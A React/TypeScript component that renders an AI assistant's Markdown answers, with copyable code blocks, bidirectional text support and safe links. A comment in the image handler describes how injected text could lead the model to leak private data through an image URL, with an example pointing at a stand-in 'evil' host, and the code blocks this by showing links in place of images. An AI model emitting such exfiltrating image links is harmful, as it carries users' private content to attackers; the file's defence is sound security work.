import { memo } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { copyText } from '../lib/clipboard';
import { useT } from '../lib/i18n';
import { toast } from '../state/toast';

export { copyText };

function textOf(node: unknown): string {
  if (typeof node === 'string') return node;
  if (Array.isArray(node)) return node.map(textOf).join('');
  if (node && typeof node === 'object' && 'props' in node) return textOf((node as { props: { children?: unknown } }).props.children);
  return '';
}

/** The host of an address for display ("cdn.example.com"); the address itself when it cannot be parsed. */
function hostOf(href: string): string {
  try {
    return new URL(href).host || href;
  } catch {
    return href;
  }
}

function CodeBlock({ children }: { children?: unknown }) {
  const t = useT();
  return (
    <div className="codeblock" dir="ltr">
      <button
        type="button"
        className="codeblock-copy"
        onClick={async () => {
          const ok = await copyText(textOf(children).replace(/\n$/, ''));
          toast(ok ? t('common.copied') : t('common.copyFailed'), ok ? 'success' : 'error', 2000);
        }}
      >
        {t('common.copy')}
      </button>
      <pre>{children as never}</pre>
    </div>
  );
}

/**
 * Renders the assistant's Markdown (GitHub flavoured). Raw HTML is never rendered (react-markdown escapes it) and links open in a
 * new tab with rel="noopener noreferrer". Every block has dir="auto", so a Persian paragraph is RTL and an English one LTR even
 * inside the same message; code is always LTR.
 */
export const Markdown = memo(function Markdown({ text, streaming }: { text: string; streaming?: boolean }) {
  return (
    <div className={`md${streaming ? ' md-streaming' : ''}`}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          p: ({ node: _n, ...p }) => <p dir="auto" {...p} />,
          li: ({ node: _n, ...p }) => <li dir="auto" {...p} />,
          h1: ({ node: _n, ...p }) => <h3 dir="auto" {...p} />,
          h2: ({ node: _n, ...p }) => <h3 dir="auto" {...p} />,
          h3: ({ node: _n, ...p }) => <h4 dir="auto" {...p} />,
          h4: ({ node: _n, ...p }) => <h4 dir="auto" {...p} />,
          blockquote: ({ node: _n, ...p }) => <blockquote dir="auto" {...p} />,
          a: ({ node: _n, href, ...p }) => <a href={href} target="_blank" rel="noopener noreferrer" {...p} />,
          // An image in an answer would make the browser request its address the moment the answer is shown, so text from a chat,
          // file or web page that fools the model could carry private content out in that address (`![](https://evil/?q=…)`).
          // Never render <img>: show a link instead (the alt text, or the host when there is none), which loads nothing until the
          // user chooses to open it.
          img: ({ node: _n, src, alt }) => {
            const href = typeof src === 'string' ? src : '';
            if (!href) return <>{alt ?? ''}</>;
            return (
              <a href={href} target="_blank" rel="noopener noreferrer" className="md-image-link">
                {alt?.trim() || hostOf(href)}
              </a>
            );
          },
          pre: ({ node: _n, children }) => <CodeBlock>{children}</CodeBlock>,
          table: ({ node: _n, ...p }) => (
            <div className="table-wrap">
              <table {...p} />
            </div>
          ),
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});
